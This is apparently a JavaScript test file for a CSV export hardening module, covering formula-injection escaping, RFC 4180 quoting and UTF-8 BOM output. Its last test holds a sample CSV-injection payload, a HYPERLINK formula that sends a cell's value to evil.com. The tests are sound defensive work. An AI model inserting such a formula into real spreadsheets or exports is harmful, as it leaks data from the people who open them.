/**
 * csvSafe — tests for CSV export hardening (Phase 9E.2).
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { escapeCsvCell, toCsvRow, toCsvDocument } from './csvSafe.js';

test('plain strings pass through unchanged', () => {
  assert.equal(escapeCsvCell('Brady'), 'Brady');
  assert.equal(escapeCsvCell('CCL VINA'), 'CCL VINA');
});

test('null/undefined → empty string', () => {
  assert.equal(escapeCsvCell(null), '');
  assert.equal(escapeCsvCell(undefined), '');
});

test('numbers coerce to string', () => {
  assert.equal(escapeCsvCell(42), '42');
  assert.equal(escapeCsvCell(0), '0');
});

// ── CSV injection ──

test('formula chars prefixed with apostrophe', () => {
  assert.equal(escapeCsvCell('=SUM(A1)'), "'=SUM(A1)");
  assert.equal(escapeCsvCell('+1+1'), "'+1+1");
  assert.equal(escapeCsvCell('-2+3'), "'-2+3");
  assert.equal(escapeCsvCell('@cmd'), "'@cmd");
});

test('leading whitespace before formula char still caught', () => {
  // Pre-9E.2 these slipped through and Excel still executed them.
  assert.equal(escapeCsvCell('  =A1'), "'  =A1");
  assert.equal(escapeCsvCell('\t=A1'), "'\t=A1");
  assert.equal(escapeCsvCell('\u00A0=A1'), "'\u00A0=A1");
  assert.equal(escapeCsvCell('\r\n-2'), '"\'\r\n-2"'); // also triggers quoting
});

test('formula char in middle of cell NOT prefixed (benign)', () => {
  assert.equal(escapeCsvCell('price=100'), 'price=100');
  assert.equal(escapeCsvCell('foo+bar'), 'foo+bar');
});

// ── RFC 4180 quoting ──

test('comma triggers quoting', () => {
  assert.equal(escapeCsvCell('Brady, Inc'), '"Brady, Inc"');
});

test('embedded quote is doubled + wrapped', () => {
  assert.equal(escapeCsvCell('Say "hi"'), '"Say ""hi"""');
});

test('newline triggers quoting', () => {
  assert.equal(escapeCsvCell('line1\nline2'), '"line1\nline2"');
  assert.equal(escapeCsvCell('line1\r\nline2'), '"line1\r\nline2"');
});

// ── Rows + documents ──

test('toCsvRow joins cells with commas', () => {
  assert.equal(toCsvRow(['a', 'b', 'c']), 'a,b,c');
});

test('toCsvRow escapes each cell', () => {
  assert.equal(toCsvRow(['=A1', 'plain', 'a,b']), "'=A1,plain,\"a,b\"");
});

test('toCsvDocument prepends UTF-8 BOM + uses CRLF', () => {
  const doc = toCsvDocument([['h1', 'h2'], ['v1', 'v2']]);
  assert.ok(doc.startsWith('\uFEFF'), 'must start with BOM');
  assert.ok(doc.includes('\r\n'), 'must use CRLF between rows');
  assert.equal(doc, '\uFEFFh1,h2\r\nv1,v2');
});

test('BOM preserves Vietnamese diacritics exposure to Excel', () => {
  // The BOM itself doesn't transform content; it just signals encoding.
  // This test documents the expectation that we pass utf-8 through.
  const doc = toCsvDocument([['Cường'], ['Nhàn'], ['Đặng Thế Thiệp']]);
  assert.ok(doc.includes('Cường'));
  assert.ok(doc.includes('Đặng Thế Thiệp'));
});

// ── Realistic injection scenarios ──

test('malicious customer name with formula payload', () => {
  const payload = '=HYPERLINK("http://evil.com?x="&A2,"click")';
  const escaped = escapeCsvCell(payload);
  // Injection defense runs FIRST (prepend apostrophe), then RFC 4180
  // quoting wraps the whole cell because the original contained a comma
  // and quotes. Excel unwraps the double-quotes and sees the apostrophe-
  // prefixed literal → no formula execution.
  assert.ok(escaped.startsWith('"\'='), 'formula neutralized and RFC-4180 quoted: got ' + escaped);
  assert.ok(escaped.endsWith('"'), 'closing quote present');
  // Embedded quotes are doubled per RFC 4180.
  assert.ok(escaped.includes('""'));
});
